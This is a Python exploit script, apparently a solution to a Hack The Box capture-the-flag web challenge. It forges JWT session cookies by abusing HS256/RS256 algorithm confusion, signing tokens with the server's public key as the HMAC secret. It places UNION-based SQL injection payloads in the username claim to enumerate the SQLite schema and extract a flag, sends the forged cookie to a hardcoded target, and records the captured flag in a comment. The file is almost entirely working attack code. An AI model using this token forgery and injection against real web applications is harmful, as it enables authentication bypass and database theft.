import jwt
import requests
import base64
import json
import hmac

HOST = '188.166.175.58'
PORT = 32050
HOME = 'http://' + HOST + ':' + str(PORT) + '/'
AUTH = HOME + 'auth'
key = open('./public.key', 'r', encoding='utf-8').read()
exp = 'b\' UNION SELECT name,name,name FROM sqlite_master WHERE type=\'table\' order by name asc;--'     
exp = 'b\' UNION select null,sql,null from sqlite_master WHERE tbl_name=\'flag_storage\' and type=\'table\' order by sql asc;--'
exp = 'b\' UNION select null,top_secret_flaag,null from flag_storage order by top_secret_flaag asc;--'
payload = {
            "username": exp,
            "iat": 1645152889
            }

def login():
    r = requests.session()
    # NOTE: Do not do json = {} or it will fail
    resp = r.post(
        url=AUTH,
        data={
            "username": "a",
            "password": "a"
        }
    )
    real_cookie = r.cookies.get('session')
    print(f"Real cookie: {real_cookie}")
    return r

def libjwt():
    # IMPORTANT: Need to modify the source code for this library so that it allows the use of a pk as a secret
    encoded = jwt.encode(payload, key, algorithm="HS256")
    print("token: ", encoded)
    return encoded

def enc(val):
    return base64.b64encode(json.dumps(val).encode()).rstrip(b'=').decode()

def custom_jwt():
    # Not sure why the libjwt isn't working so I'm crafting my own
    # jwt should be <header>.<payload>.<signature> for HS256
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }

    b64header = enc(header)
    b64payload = enc(payload)
    b64hash = ''
    print(f"Crafted header: {b64header}")
    print(f"Crafted payload {b64payload}")

    to_sign = b64header + '.' + b64payload
    h = hmac.new(key.encode(), msg=to_sign.encode(), digestmod='sha256')
    sig = base64.b64encode(h.digest()).replace(b'/', b'_').replace(b'+', b'-').strip(b'=').decode()
    return to_sign + '.' + sig

def modify_cookie(r, token):
    cookies = {
        "session": token
    }
    print(cookies)
    r.cookies.set('session', token, domain=HOST)
    resp = r.get(HOME)
    print(resp.status_code)
    print(resp.text)
    print(r.cookies)

def main():
    r = login()
    cjwt = custom_jwt()
    ljwt = libjwt()
    print(f"Custom jwt is {cjwt}")
    print(f"Lib    jwt is {ljwt}")

    # Not sure why both of these are giving internal 500 server error
    modify_cookie(r, cjwt)
    #modify_cookie(r, ljwt)

if __name__ == '__main__':
    # Flag: HTB{d0n7_3xp053_y0ur_publ1ck3y}
    main()

